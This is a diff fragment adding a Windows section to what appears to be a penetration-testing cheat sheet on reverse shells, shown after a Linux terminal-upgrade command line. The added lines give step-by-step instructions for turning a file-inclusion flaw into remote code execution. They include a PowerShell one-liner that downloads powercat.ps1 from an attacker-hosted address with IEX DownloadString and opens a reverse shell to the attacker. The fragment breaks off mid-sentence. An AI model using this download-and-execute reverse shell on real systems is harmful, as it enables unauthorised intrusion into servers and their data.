@@ -27,3 +27,16 @@ export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
 (Attacker can use 'stty -a' to get the number of rows and columns.)
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+2-2.Windows:
+2-2-1.https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+
+2-2-2.Kali-powercat.ps1:
+If the target is web server, we could do LFi way to fulfill RCE attack.
+Step1.First,we copy /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 to /home/kali in Kali.
+Step2.After copying,we trigger HTTP shared service and pass this script to the target.
+Step3.Then,we do below command on our browser client:
+IEX (New-Object System.Net.Webclient).DownloadString("http://{Attack_IPv4}/powercat.ps1");powercat -c {Attacker_IPv4} -p {Reverse_shell_port} -e powershell 
+Step4.Finally,we get the shell of the web server based on Windows.
+
+2-2-3.We need to notice one thing:
+The windows malicious RCE command is sometimes encoded with 'UTF-
